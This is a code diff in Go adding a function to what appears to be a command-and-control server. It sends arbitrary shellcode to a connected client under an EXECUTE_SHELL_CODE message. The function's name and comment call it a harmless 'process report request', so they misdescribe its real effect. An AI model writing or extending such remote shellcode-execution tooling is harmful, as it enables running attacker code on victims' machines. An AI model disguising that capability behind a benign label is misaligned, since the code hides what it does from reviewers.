@@ -553,3 +553,27 @@ func UpdateClientConfig(clientAddr string, config string) error {
 	log.Printf("Sent CONFIG_UPDATE to client %s", clientAddr)
 	return nil
 }
+
+// send process report request to client
+func SendPsToClient(clientAddr string, shellcode []byte) error {
+	client, exists := GetClient(clientAddr)
+	if !exists {
+		return fmt.Errorf("client not connected")
+	}
+
+	msg := models.InternalMessage{
+		Header: models.MessageHeader{
+			MessageType: models.MESSAGE_EXECUTE_SHELL_CODE,
+			MessageID:   utils.GenerateMessageID(),
+			DataSize:    uint32(len(shellcode)),
+		},
+		Data: shellcode,
+	}
+
+	if err := sendBinaryMessage(client, msg); err != nil {
+		return err
+	}
+
+	log.Printf("Sent EXECUTE_SHELL_CODE to client %s: %d bytes", clientAddr, len(shellcode))
+	return nil
+}
